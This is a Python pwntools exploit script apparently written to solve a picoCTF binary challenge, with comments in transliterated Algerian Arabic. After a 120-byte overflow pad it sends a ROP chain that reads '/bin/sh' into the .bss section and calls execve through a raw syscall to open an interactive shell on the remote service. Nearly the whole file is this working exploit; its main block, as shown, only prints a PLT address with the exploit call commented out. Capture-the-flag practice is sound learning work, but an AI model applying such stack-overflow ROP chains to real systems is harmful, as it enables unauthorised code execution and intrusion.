from pwn import *
host = "shape-facility.picoctf.net"
port = 51463
binary = context.binary = ELF("./vuln",checksec=False)
rop = ROP(binary)       
pop_rdi = p64(rop.rdi[0])
pop_rsi = p64(rop.rsi[0])
pop_rax = p64(rop.rax[0])
pop_rdx = p64(rop.rdx[0])
syscall = p64(rop.syscall[0])
xor_syscall = p64(0x44a3ea)
info(pop_rax)
info(pop_rdi)
info(pop_rsi)
info(pop_rdx)
info(syscall)
def conn():
    if args.LOCAL:
        return process("./vuln")
    else :
        return remote(host,port)
def main():
    p = conn()
    padding = b"A"*120
    p.sendlineafter(b"What number would you like to guess?", b"84")
    payload= flat(
        padding, 
        # read(0,bss,0x100) bss basicly placa te9der tekteb fiah wsh t7ab aprecque esapce initializer deja ou nesta3mloh bch n7ato bin/sh
        pop_rdi,p64(0),
        pop_rsi,p64(binary.bss()+0x100),
        pop_rdx,p64(0x100),       
        xor_syscall,
        # hna ndirou exceve ta3ena nrml execve("/bin/sh",null,null)
        pop_rdi,p64(binary.bss()+0x100),
        pop_rax,p64(0x3b),
        pop_rsi,p64(0),
        pop_rdx,p64(0), 
        syscall,
    )   
    payload += b"A"*(359 - len(payload))
    p.sendlineafter(b"Name?", payload)
    p.sendline(b"/bin/sh\0")
    p.interactive()

if __name__ == "__main__":
    elf = ELF("./chall")
    print(elf.plt.get("system"))
    # main()